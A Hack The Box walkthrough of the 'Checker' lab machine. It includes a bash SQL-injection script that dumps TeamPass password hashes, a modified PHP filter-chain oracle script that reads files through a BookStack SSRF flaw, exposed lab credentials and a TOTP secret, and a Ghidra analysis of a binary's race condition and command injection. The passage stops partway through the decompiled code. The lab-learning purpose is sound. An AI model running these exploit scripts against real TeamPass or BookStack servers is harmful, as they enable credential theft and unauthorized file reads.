---
title: Checker [Hard]
date: 2025-02-23
categories: [HackTheBox]
tags: AppSec Web RE Linux
img_path: /assets/Images/HTB_Checker/logo.png
image:
  path: /assets/Images/HTB_Checker/logo.png
---

# Checker [Hard]

![photo_2025-02-26 5.43.17 PM.jpeg](/assets/Images/HTB_Checker/photo_2025-02-26_5.43.17_PM.jpeg)

## `Machine Summary :`

The **Checker** machine from Hack The Box, a hard-rated Linux challenge, required a combination of web exploitation, credential analysis, and binary exploitation to achieve root access. Initial enumeration revealed two open ports: **80 (`BookStack`)** and **8080 (`TeamPass CMS`)**. Exploiting an **SQL Injection vulnerability** in TeamPass allowed the extraction of user password hashes, one of which was successfully cracked. These credentials provided access to both BookStack and SSH. Further enumeration in BookStack led to the discovery of **`CVE-2023-6199`**, which exposed the **Google Authentication secret**, enabling the generation of a valid OTP for SSH login. Once inside, a **SUID script** and a vulnerable binary (**check_leak**) were identified. Reverse engineering in **Ghidra** revealed **a `race condition`, weak cryptographic algorithm, and `command injection` vulnerability**. Crafting a **custom `C exploit`** successfully escalated privileges to `root`. The machine tested a variety of security skills, including **web exploitation, authentication bypass, and advanced binary exploitation**, making it a well-rounded challenge.

## 🤨 Enumeration :-

```bash
nmap -T4 -vv -sC -sV -oN nmap/intial 10.10.11.56
```

```bash
# Nmap 7.94SVN as: nmap -T4 -vv -sC -sV -oN nmap/intial 10.10.11.56
Nmap scan report for checker.htb (10.10.11.56)
Host is up, received echo-reply ttl 63 (0.27s latency).
Scanned at 2025-02-26 23:06:26 IST for 19s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNQsMcD52VU4FwV2qhq65YVV9Flp7+IUAUrkugU+IiOs5ph+Rrqa4aofeBosUCIziVzTUB/vNQwODCRSTNBvdXQ=
|   256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRBr02nNGqdVIlkXK+vsFIdhcYJoWEVqAIvGCGz+nHY
80/tcp   open  http    syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden #[I don't know why it was showing 403 🤷🏻]
8080/tcp open  http    syn-ack ttl 63 Apache httpd
|_http-server-header: Apache
|_http-title: 403 Forbidden #[I don't know why it was showing 403 🤷🏻]
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Port `80` : 

![Screenshot 2025-02-25 at 12.08.34 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_12.08.34_AM.png)

Port `8080` :

![Screenshot 2025-02-26 at 8.20.34 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_8.20.34_PM.png)

---

### SQL Injection [ CVE-2023-1545 ]

After searching vulnerability for the TeamPass CMS 

We got this

![Screenshot 2025-02-26 at 8.21.05 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_8.21.05_PM.png)

Read this 

[Snyk Vulnerability Database | Snyk](https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612)

`sqli.sh`

```bash
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done
```

![Screenshot 2025-02-26 at 5.08.40 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.08.40_PM.png)

```bash
./sqli.py http://checker.htb:8080
```

```bash
There are 2 users in the system:
admin: $2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
bob: $2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
```

To Identify

![Screenshot 2025-02-26 at 5.11.26 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.11.26_PM.png)

```bash
hashcat -m 3200 hashes_sqli /usr/share/wordlists/rockyou.txt --user
```

![Screenshot 2025-02-26 at 5.12.41 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.12.41_PM.png)

```bash
bob:cheerleader
```

Go and login to this Teampass login page
http://checker.htb:8080/

![Screenshot 2025-02-25 at 12.09.04 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_12.09.04_AM.png)

![Screenshot 2025-02-25 at 12.10.15 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_12.10.15_AM.png)

Okay, We got the bookstack login credentials 

![Screenshot 2025-02-25 at 12.10.06 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_12.10.06_AM.png)

We got the ssh credentials 

![Screenshot 2025-02-25 at 12.09.35 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_12.09.35_AM.png)

Login with the ssh with `reader`:`hiccup-publicly-genesis`

![Screenshot 2025-02-26 at 5.19.11 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.19.11_PM.png)

Okay we need a Verification code to login into this 

---

Now Login Port `80`

→ `bob@reader.htb`:`mYSeCr3T_W1kl_P4sSw0rD`

![Screenshot 2025-02-25 at 12.10.36 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_12.10.36_AM.png)

There is a default book `Linux security` 

![Screenshot 2025-02-26 at 5.17.51 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.17.51_PM.png)

![Screenshot 2025-02-26 at 5.18.02 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.18.02_PM.png)

In Basic Backup with cp Page reveals a PATH of a backup which we can take a note of this.

![Screenshot 2025-02-26 at 8.55.04 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_8.55.04_PM.png)

Now,

Checking the Muti-Factor Authentication in Settings

![Screenshot 2025-02-26 at 5.16.37 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.16.37_PM.png)

![Screenshot 2025-02-26 at 5.16.47 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.16.47_PM.png)

Okay we got that The OTP which the ssh shell was asking it the `TOTP Google Authentication`

So we can just search it about !
The Default PATH for the Google Auth secret is this ! [Note this thing.]

```bash
~/.google_authenticator
```

![Screenshot 2025-02-26 at 8.58.55 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_8.58.55_PM.png)

After a little bit of search BookStack 23.10.2 exploits 

We got a article : )

---

## 🔱 Initial Access :-

### **CVE-2023-6199 | LFR & SSRF**

[LFR via SSRF in BookStack | Blog | Fluid Attacks](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/)

→ **LFR** stands for **Local File Read** (or **Local File Retrieval**). It is a type of vulnerability that allows an attacker to read files on the server's filesystem. This is often a subset of **Local File Inclusion (LFI)** vulnerabilities, where an application improperly includes or reads files from the server.

### **Summary of LFR via SSRF in BookStack**

The article describes a **Local File Read (LFR)** vulnerability in **BookStack**, a popular open-source knowledge management platform. The vulnerability arises due to a **Blind Server-Side Request Forgery (SSRF)** issue, which allows an attacker to read local files on the server.

### **Key Points**:

1. **Vulnerability**:
    - A blind SSRF in BookStack allows attackers to make internal requests to the server.
    - By exploiting this, an attacker can read local files (LFR) by tricking the server into fetching them.
2. **Exploitation**:
    - The attacker uses a crafted payload to force the server to read local files (e.g., `/etc/passwd`).
    - The SSRF is blind, meaning the attacker doesn't directly see the response but can infer the file content through indirect means (e.g., timing or error-based techniques).
3. **Impact**:
    - Sensitive files on the server can be leaked, such as configuration files, environment variables, or credentials.
    - This can lead to further exploitation, such as privilege escalation or remote code execution.
4. **Fix**:
    - The issue was reported and patched by the BookStack team. Users are advised to update to the latest version to mitigate the risk.

### **Conclusion**:

The article highlights the dangers of SSRF vulnerabilities and how they can be chained with LFR to compromise a server. It underscores the importance of proper input validation and secure coding practices to prevent such attacks.

To learn more about this exploit Check this link 

[LFR via SSRF in BookStack | Blog | Fluid Attacks](https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/)

[https://github.com/synacktiv/php_filter_chains_oracle_exploit.git](https://github.com/synacktiv/php_filter_chains_oracle_exploit.git)

Path where you have to change that requestor.py

```bash
php_filter_chains_oracle_exploit/filters_chain_oracle/core/requestor.py
```

`requestor.py`

```bash
import json
import requests
import time
import base64  # Ensure base64 module is imported
from filters_chain_oracle.core.verb import Verb
from filters_chain_oracle.core.utils import merge_dicts
import re

"""
Class Requestor, defines all the request logic.
"""
class Requestor:
    def __init__(self, file_to_leak, target, parameter, data="{}", headers="{}", verb=Verb.POST, in_chain="", proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):
        self.file_to_leak = file_to_leak
        self.target = target
        self.parameter = parameter
        self.headers = headers
        self.verb = verb
        self.json_input = json_input
        self.match = match
        print("[*] The following URL is targeted : {}".format(self.target))
        print("[*] The following local file is leaked : {}".format(self.file_to_leak))
        print("[*] Running {} requests".format(self.verb.name))
        if data != "{}":
            print("[*] Additionnal data used : {}".format(data))
        if headers != "{}":
            print("[*] Additionnal headers used : {}".format(headers))
        if in_chain != "":
            print("[*] The following chain will be in each request : {}".format(in_chain))
            in_chain = "|convert.iconv.{}".format(in_chain)
        if match:
            print("[*] The following pattern will be matched for the oracle : {}".format(match))
        self.in_chain = in_chain
        self.data = json.loads(data)
        self.headers = json.loads(headers)
        self.delay = float(delay)
        if proxy :
            self.proxies = {
                'http': f'{proxy}',
                'https': f'{proxy}',
            }
        else:
            self.proxies = None
        self.instantiate_session()
        if time_based_attack:
            self.time_based_attack = self.error_handling_duration()
            print("[+] Error handling duration : {}".format(self.time_based_attack))
        else:
            self.time_based_attack = False
        
    """
    Instantiates a requests session for optimization
    """
    def instantiate_session(self):
        self.session = requests.Session()
        self.session.headers.update(self.headers)
        self.session.proxies = self.proxies
        self.session.verify = False

    def join(self, *x):
        return '|'.join(x)

    """
    Used to see how much time a 500 error takes to calibrate the timing attack
    """
    def error_handling_duration(self):
        chain = "convert.base64-encode"
        requ = self.req_with_response(chain)
        self.normal_response_time = requ.elapsed.total_seconds()
        self.blow_up_utf32 = 'convert.iconv.L1.UCS-4'
        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)
        chain_triggering_error = f"convert.base64-encode|{self.blow_up_inf}"
        requ = self.req_with_response(chain_triggering_error)
        return requ.elapsed.total_seconds() - self.normal_response_time

    """
    Used to parse the option parameter sent by the user
    """
    def parse_parameter(self, filter_chain):
        data = {}
        if '[' and ']' in self.parameter: # Parse array elements
            
            main_parameter = [re.search(r'^(.*?)\[', self.parameter).group(1)]
            sub_parameters = re.findall(r'\[(.*?)\]', self.parameter)
            all_params = main_parameter + sub_parameters
            json_object = {}
            temp = json_object
            for i, element in enumerate(all_params):
                if i == len(all_params) -1:
                    temp[element] = filter_chain
                else:
                    temp[element] = {}
                    temp = temp[element]
            data = json_object
        else:
            data[self.parameter] = filter_chain
        return merge_dicts(data, self.data)

    """
    Returns the response of a request defined with all options
    """
    def req_with_response(self, s):
        if self.delay > 0:
            time.sleep(self.delay)

        filter_chain = f'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'
        # DEBUG print(filter_chain)
        merged_data = self.parse_parameter(filter_chain)

        # Fix indentation: Encode filter chain in Base64
        encoded_bytes = base64.b64encode(filter_chain.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        payload = f"<img src='data:image/png;base64,{encoded_str}'/>"
        merged_data[self.parameter] = payload  # Fixed indentation

        # Make the request, the verb and data encoding is defined
        try:
            if self.verb == Verb.GET:
                requ = self.session.get(self.target, params=merged_data)
                return requ
            elif self.verb == Verb.PUT:
                if self.json_input: 
                    requ = self.session.put(self.target, json=merged_data)
                else:
                    requ = self.session.put(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.DELETE:
                if self.json_input:
                    requ = self.session.delete(self.target, json=merged_data)
                else:
                    requ = self.session.delete(self.target, data=merged_data)
                return requ
            elif self.verb == Verb.POST:
                if self.json_input:
                    requ = self.session.post(self.target, json=merged_data)
                else:
                    requ = self.session.post(self.target, data=merged_data)
                return requ
        except requests.exceptions.ConnectionError :
            print("[-] Could not instantiate a connection")
            exit(1)
        return None

    """
    Used to determine if the answer trigged the error based oracle
    TODO : increase the efficiency of the time based oracle
    """
    def error_oracle(self, s):
        requ = self.req_with_response(s)

        if self.match:
            # DEBUG print("PATT", (self.match in requ.text))
            return self.match in requ.text 

        if self.time_based_attack:
            # DEBUG print("ELAP", requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01))
            return requ.elapsed.total_seconds() > ((self.time_based_attack/2)+0.01)
        
        # DEBUG print("CODE", requ.status_code == 500)
        return requ.status_code == 500

```

From the 2 info which we got from above enumeration that backup path and that default google auth file we can check that file through this exploit.
Command to get the google_authenticator secret !

```bash
python filters_chain_oracle_exploit.py \
  --target "http://checker.htb/ajax/page/12/save-draft" \
  --file "/backup/home_backup/home/reader/.google_authenticator" \
  --parameter "html" \
  --verb PUT \
  --headers "{\"X-CSRF-TOKEN\": \"$CSRF-TOKEN\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Cookie\": \"jstree_select=1; XSRF-TOKEN=$XSRF-TOKEN; bookstack_session=$BookStack_Session; teampass_session=$TeamPass_Session\"}"
```

![Screenshot 2025-02-25 at 12.48.57 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_12.48.57_AM.png)

To paste the Secret on this website it will give you the OTP !

[IT Tools - Handy online tools for developers](https://it-tools.tech/otp-generator)

```bash
DVDBRAODLCWF7I2ONA4K5LQLUE
```

![Screenshot 2025-02-26 at 6.01.00 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_6.01.00_PM.png)

![Screenshot 2025-02-25 at 1.06.11 AM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-25_at_1.06.11_AM.png)

## Explanation

### Working of the `Requestor` Class

The `Requestor` class is designed to perform HTTP requests with specific configurations, often used in security testing or exploitation scenarios, such as file inclusion attacks or timing-based attacks. Here's a breakdown of its key components and functionality:

---

**Important Parts**

1. **Filter Chain Construction**:
    - The filter chain (e.g., `php://filter/convert.base64-encode/resource=file_to_leak`) is dynamically constructed and embedded in the request payload.
    - This is often used in file inclusion attacks to manipulate file content or trigger errors.
2. **Base64 Encoding**:
    - The filter chain is Base64-encoded and embedded in the payload (e.g., `<img src='data:image/png;base64,...'/>`).
    - This technique is used to bypass certain input filters or WAFs (Web Application Firewalls).
3. **Timing-Based Attacks**:
    - If `time_based_attack` is enabled, the class measures the response time for error handling and uses it to detect delays in server responses.
    - This is useful for blind exploitation scenarios where direct error messages are not available.
4. **Error-Based Oracle**:
    - The `error_oracle` method checks if the response matches a specific pattern (`match`) or triggers a server error (e.g., 500 status code).
    - It also supports timing-based detection for blind attacks.

---

### **Summary**

The `Requestor` class is a versatile tool for performing HTTP requests with advanced configurations, particularly in security testing scenarios. It supports:

- **File inclusion attacks** by constructing and embedding filter chains.
- **Error-based detection** by checking response patterns or status codes.
- **Timing-based attacks** by measuring response times and detecting delays.
- **Flexible request types** (GET, POST, PUT, DELETE) with support for JSON or form-data encoding.

This class is particularly useful for exploiting vulnerabilities like Local File Inclusion (LFI) or testing server responses in a controlled manner.

---

## 💀 Privilege Escalation :-

```bash
ssh reader@checker.htb
(reader@10.10.11.56) Password: **hiccup-publicly-genesis**
(reader@10.10.11.56) Verification code:
```

```bash
cd /opt/hash-checker/
```

![Screenshot 2025-02-26 at 5.21.46 PM.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.21.46_PM.png)

There is a Binary `check_leak` Which we can do some Reverse Engineering things on that

You can use any Tool : IDA_Pro, Binary Ninja, etc

i Used `Ghidra` because it was Free : ) 

![ghidra.png](/assets/Images/HTB_Checker/ghidra.png)

For people who don’t know about this tool and how you can check the things : )
How to use Ghidra [only for people who never used this tool. Read this]
Link :- [https://www.varonis.com/blog/how-to-use-ghidra](https://www.varonis.com/blog/how-to-use-ghidra)

![Screenshot 2025-02-26 at 5.52.21 PM copy.png](/assets/Images/HTB_Checker/Screenshot_2025-02-26_at_5.52.21_PM_copy.png)

### `main` : Race Condition

```nasm
undefined8 main(int param_1,ulong param_2)

{
  char *__s;
  char cVar1;
  uint uVar2;
  char *getHost;
  char *getUser;
  char *dbPass;
  char *dbName;
  size_t sVar3;
  void *__ptr;
  
  getHost = getenv("DB_HOST");
  getUser = getenv("DB_USER");
  dbPass = getenv("DB_PASSWORD");
  dbName = getenv("DB_NAME");
  if (*(char *)((param_2 + 8 >> 3) + 0x7fff8000) != '\0') {
    __asan_report_load8(param_2 + 8);
  }
  __s = *(char **)(param_2 + 8);
  if ((((getHost == (char *)0x0) || (getUser == (char *)0x0)) || (dbPass == (char *)0x0)) ||
     (dbName == (char *)0x0)) {
    if (DAT_80019140 != '\0') {
      __asan_report_load8(&stderr);
    }
    fwrite("Error: Missing database credentials in environment\n",1,0x33,stderr);
    __asan_handle_no_return();
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 2) {
    if (*(char *)((param_2 >> 3) + 0x7fff8000) != '\0') {
      __asan_report_load8(param_2);
    }
    if (DAT_80019140 != '\0') {
      __asan_report_load8(&stderr);
    }
    fprintf(stderr,"Usage: %s <USER>\n");
    __asan_handle_no_return();
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (__s != (char *)0x0) {
    cVar1 = *(char *)(((ulong)__s >> 3) + 0x7fff8000);
    if (cVar1 <= (char)((byte)__s & 7) && cVar1 != '\0') {
      __asan_report_load1(__s);
    }
    if (*__s != '\0') {
      sVar3 = strlen(__s);
      if (0x14 < sVar3) {
        if (DAT_80019140 != '\0') {
          __asan_report_load8(&stderr);
        }
        fwrite("Error: <USER> is too long. Maximum length is 20 characters.\n",1,0x3c,stderr);
        __asan_handle_no_return();
                    /* WARNING: Subroutine does not return */
        exit(1);
      }
      __ptr = (void *)fetch_hash_from_db(getHost,getUser,dbPass,dbName,__s);
      if (__ptr == (void *)0x0) {
        puts("User not found in the database.");
      }
      else {
        cVar1 = check_bcrypt_in_file("/opt/hash-checker/leaked_hashes.txt",__ptr);
        if (cVar1 == '\0') {
          puts("User is safe.");
        }
        else {
          puts("Password is leaked!");
          if (DAT_8001913c != '\0') {
            __asan_report_load8(&stdout);
          }
          fflush(stdout);
          uVar2 = write_to_shm(__ptr);
          printf("Using the shared memory 0x%X as temp location\n",(ulong)uVar2);
          if (DAT_8001913c != '\0') {
            __asan_report_load8(&stdout);
          }
          fflush(stdout);
          sleep(1);
          notify_user(getHost,getUser,dbPass,dbName,uVar2);
          clear_shared_memory(uVar2);
        }
        free(__ptr);
      }
      return 0;
    }
  }
  if (DAT_80019140 != '\0') {
    __asan_report_load8(&stderr);
  }
  fwrite("Error: <USER> is not provided.\n",1,0x1f,stderr);
  __asan_handle_no_return();
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

### **Explaining the `main` Function (Race Condition Vulnerability)**

This function is part of a program that checks if a user's password has been leaked by comparing it to a list of known compromised passwords. However, due to the way it handles shared memory, it may have a **Race Condition** vulnerability. Let's break it down step by step:

---

**1. Checking Command-Line Arguments**

The program expects exactly **one argument** from the user:

```c
if (param_1 != 2) {
    fprintf(stderr, "Usage: %s <USER>\n");
    exit(1);
}
```

- If the user does not provide a username, it **exits with an error**.

---

**2. Validating Username Length**

```c
sVar3 = strlen(__s);
if (0x14 < sVar3) {   // 0x14 (Hex) = 20 (Decimal)
    fwrite("Error: <USER> is too long. Maximum length is 20 characters.\n",1,0x3c,stderr);
    exit(1);
}
```

- The username is **restricted to 20 characters**, preventing **buffer overflow** attacks.
- If the input is too long, the program prints an error and exits.

---

**3. Fetching Hash from the Database**

```c
__ptr = (void *)fetch_hash_from_db(getHost, getUser, dbPass, dbName, __s);
```

- The program **queries the database** to find the password hash of the given username.
- If the user is **not found**, it prints:

and exits.
    
    ```
    User not found in the database.
    ```
    

---

**4. Checking If the Password Is Leaked**

```c
cVar1 = check_bcrypt_in_file("/opt/hash-checker/leaked_hashes.txt", __ptr);
```

- The program **compares the retrieved password hash** with a list of known leaked hashes stored in `leaked_hashes.txt`.
    - If the hash is **not found**, it prints:
        
        ```
        User is safe.
        ```
        
    - If the hash **is found**, it prints:
    
    and takes additional actions.
        
        ```
        Password is leaked!
        ```
        

---

**5. Writing the Hash to Shared Memory**

```c
uVar2 = write_to_shm(__ptr);
printf("Using the shared memory 0x%X as temp location\n", (ulong)uVar2);

```

- The leaked password hash is **written into shared memory**, which acts as a temporary storage area.

---

**6. Introducing the Race Condition**

```c
sleep(1);
notify_user(getHost, getUser, dbPass, dbName, uVar2);
clear_shared_memory(uVar2);

```

- **This is where the vulnerability exists!**
- The program **sleeps for 1 second** before notifying the user and then **clears the shared memory**.

**What does this mean?**

1. **The hash is written to shared memory**.
2. **The program waits for 1 second**.
3. **Then it deletes the shared memory**.
- However, **during this 1-second window**, an attacker can **read the shared memory** before it is erased.

---

### **Understanding the Race Condition Vulnerability**

- A **race condition** occurs when two or more processes **access shared resources** in an **uncontrolled manner**.
- In this case, the **shared memory** holds sensitive information (**the leaked password hash**).
- Since the program **delays deleting the shared memory for 1 second**, an attacker can:
    1. **Quickly read the shared memory** before it is deleted.
    2. **Extract the leaked password hash** and use it for malicious purposes.

**Potential Exploit**

- An attacker could run a script that **constantly reads shared memory** at high speed.
- If timed correctly, they can **steal the password hash** before it is cleared.

---

**How to Fix This?**

**1. Securely Handle Shared Memory**

- Instead of keeping sensitive data in shared memory, **store it in a secure location**.
- Use **temporary files with proper permissions** instead of shared memory.

**2. Remove the Sleep Function**

- Instead of waiting **before clearing the shared memory**, delete it **immediately after use**.

**3. Use Proper Synchronization**

- Implement **mutex locks** or **semaphores** to **prevent concurrent access** to shared memory.

---

### `write_to_shm` : Weak Algorithm

```nasm
int write_to_shm(undefined8 param_1)

{
  char cVar1;
  int iVar2;
  int __shmid;
  undefined8 *puVar3;
  time_t tVar4;
  char *__s;
  char *__s_00;
  size_t sVar5;
  char *pcVar6;
  undefined8 *puVar7;
  ulong uVar8;
  long in_FS_OFFSET;
  undefined8 local_88 [11];
  long local_30;
  
  puVar7 = local_88;
  if (__asan_option_detect_stack_use_after_return != 0) {
    puVar3 = (undefined8 *)__asan_stack_malloc_0(0x40);
    if (puVar3 != (undefined8 *)0x0) {
      puVar7 = puVar3;
    }
  }
  *puVar7 = 0x41b58ab3;
  puVar7[1] = "1 32 8 7 now:105";
  puVar7[2] = write_to_shm;
  uVar8 = (ulong)puVar7 >> 3;
  *(undefined4 *)(uVar8 + 0x7fff8000) = 0xf1f1f1f1;
  *(undefined4 *)(uVar8 + 0x7fff8004) = 0xf3f3f300;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  tVar4 = time((time_t *)0x0);
  srand((uint)tVar4);
  iVar2 = rand();
  __shmid = shmget(iVar2 % 0xfffff,0x400,0x3b6);
  if (__shmid == -1) {
    perror("shmget");
    __asan_handle_no_return();
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __s = (char *)shmat(__shmid,(void *)0x0,0);
  if (__s == (char *)0xffffffffffffffff) {
    perror("shmat");
    __asan_handle_no_return();
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  tVar4 = time((time_t *)0x0);
  if (*(char *)(((ulong)(puVar7 + 4) >> 3) + 0x7fff8000) != '\0') {
    tVar4 = __asan_report_store8(puVar7 + 4);
  }
  puVar7[4] = tVar4;
  __s_00 = ctime(puVar7 + 4);
  sVar5 = strlen(__s_00);
  pcVar6 = __s_00 + (sVar5 - 1);
  cVar1 = *(char *)(((ulong)pcVar6 >> 3) + 0x7fff8000);
  if (cVar1 <= (char)((byte)pcVar6 & 7) && cVar1 != '\0') {
    __asan_report_store1(pcVar6);
  }
  *pcVar6 = '\0';
  snprintf(__s,0x400,"Leaked hash detected at %s > %s\n",__s_00,param_1);
  shmdt(__s);
  if (local_88 == puVar7) {
    *(undefined8 *)(uVar8 + 0x7fff8000) = 0;
  }
  else {
    *puVar7 = 0x45e0360e;
    *(undefined8 *)(uVar8 + 0x7fff8000) = 0xf5f5f5f5f5f5f5f5;
    *(undefined1 *)puVar7[7] = 0;
  }
  if (local_30 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar2 % 0xfffff;
}
```

→ The function `write_to_shm` creates and writes data into a shared memory segment using `shmget` and `shmat`. The key for the shared memory is derived from `rand()`, which is seeded with `time(0)`, making it predictable. The memory segment has `rw-rw-rw-` (1666 in octal) permissions, allowing any process to read and write to it. This introduces a security risk, as an attacker could predict the key, attach to the shared memory, and manipulate or extract sensitive data. The function writes a formatted message indicating a "leaked hash" into the shared memory before detaching from it.

### `notify_user` : (Command Injection)

```nasm
void notify_user(undefined8 param_1,undefined8 param_2,char *param_3,undefined8 param_4,uint param_5
                )

{
  char cVar1;
  uint __shmid;
  int iVar2;
  undefined8 *puVar3;
  char *__haystack;
  char *pcVar4;
  undefined8 uVar5;
  FILE *__stream;
  char *pcVar6;
  ulong uVar7;
  bool bVar8;
  char *extraout_RDX;
  ulong uVar9;
  undefined8 *puVar10;
  long in_FS_OFFSET;
  undefined8 local_1a8 [47];
  long local_30;
  
  puVar10 = local_1a8;
  if ((__asan_option_detect_stack_use_after_return != 0) &&
     (puVar3 = (undefined8 *)__asan_stack_malloc_3(0x160), puVar3 != (undefined8 *)0x0)) {
    puVar10 = puVar3;
  }
  *puVar10 = 0x41b58ab3;
  puVar10[1] = "1 32 256 17 result_buffer:171";
  puVar10[2] = notify_user;
  uVar9 = (ulong)puVar10 >> 3;
  *(undefined4 *)(uVar9 + 0x7fff8000) = 0xf1f1f1f1;
  *(undefined4 *)(uVar9 + 0x7fff8024) = 0xf3f3f3f3;
  *(undefined4 *)(uVar9 + 0x7fff8028) = 0xf3f3f3f3;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  __shmid = shmget(param_5,0,0x1b6);
  if (__shmid == 0xffffffff) {
    printf("No shared memory segment found for the given address: 0x%X\n",(ulong)param_5);
  }
  else {
    __haystack = (char *)shmat(__shmid,(void *)0x0,0);
    if (__haystack == (char *)0xffffffffffffffff) {
      if (DAT_80019140 != '\0') {
        __asan_report_load8(&stderr);
      }
      fprintf(stderr,
              "Unable to attach to shared memory segment with ID %d. Please check if the segment is accessible.\n"
              ,(ulong)__shmid);
    }
    else {
      pcVar4 = strstr(__haystack,"Leaked hash detected");
      if (pcVar4 == (char *)0x0) {
        puts("No hash detected in shared memory.");
      }
      else {
        pcVar4 = strchr(pcVar4,0x3e);
        if (pcVar4 == (char *)0x0) {
          puts("Malformed data in the shared memory.");
        }
        else {
          uVar5 = trim_bcrypt_hash(pcVar4 + 1);
          iVar2 = setenv("MYSQL_PWD",param_3,1);
          if (iVar2 == 0) {
            iVar2 = snprintf((char *)0x0,0,
                             "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw  = \"%s\"\'"
                             ,param_2,param_4,uVar5);
            pcVar4 = (char *)malloc((long)(iVar2 + 1));
            if (pcVar4 == (char *)0x0) {
              puts("Failed to allocate memory for command");
              shmdt(__haystack);
              bVar8 = false;
            }
            else {
              snprintf(pcVar4,(long)(iVar2 + 1),
                       "mysql -u %s -D %s -s -N -e \'select email from teampass_users where pw = \"% s\"\'"
                       ,param_2,param_4,uVar5);
              __stream = popen(pcVar4,"r");
              if (__stream == (FILE *)0x0) {
                puts("Failed to execute MySQL query");
                free(pcVar4);
                shmdt(__haystack);
                bVar8 = false;
              }
              else {
                pcVar6 = fgets((char *)(puVar10 + 4),0x100,__stream);
                if (pcVar6 == (char *)0x0) {
                  puts("Failed to read result from the db");
                  pclose(__stream);
                  free(pcVar4);
                  shmdt(__haystack);
                  bVar8 = false;
                }
                else {
                  pclose(__stream);
                  free(pcVar4);
                  pcVar4 = strchr((char *)(puVar10 + 4),10);
                  if (pcVar4 != (char *)0x0) {
                    cVar1 = *(char *)(((ulong)pcVar4 >> 3) + 0x7fff8000);
                    if (cVar1 <= (char)((byte)pcVar4 & 7) && cVar1 != '\0') {
                      __asan_report_store1(pcVar4);
                    }
                    *pcVar4 = '\0';
                  }
